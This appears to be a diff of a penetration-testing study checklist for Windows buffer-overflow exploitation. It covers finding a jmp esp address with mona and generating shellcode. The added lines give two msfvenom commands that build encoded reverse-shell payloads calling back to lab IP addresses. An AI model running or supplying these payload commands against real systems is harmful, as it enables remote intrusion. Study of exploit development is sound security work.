@@ -21,8 +21,10 @@
 6. Redirecting execution flow
     1.  `!py mona jmp -r esp -cpb '\x00'`: if lot of space (ex.: `inputBuffer += pack("<I",0x00418674) #00418674`)
 7. Generating shellcode
-8. Getting the shellcode
-9. Improving the exploit (not to crash the application)
+    1. Basic encoded: `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.181 LPORT=443 -f python –e x86/shikata_ga_nai -b "\x00"`
+    2. Avoid crashing: `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f python –e x86/shikata_ga_nai -b "\x00\x0a"`
+9. Getting the shellcode
+10. Improving the exploit (not to crash the application)
     1. If multi-threaded application, add to msf-venom `EXITFUNC=thread`
 
 ## Links
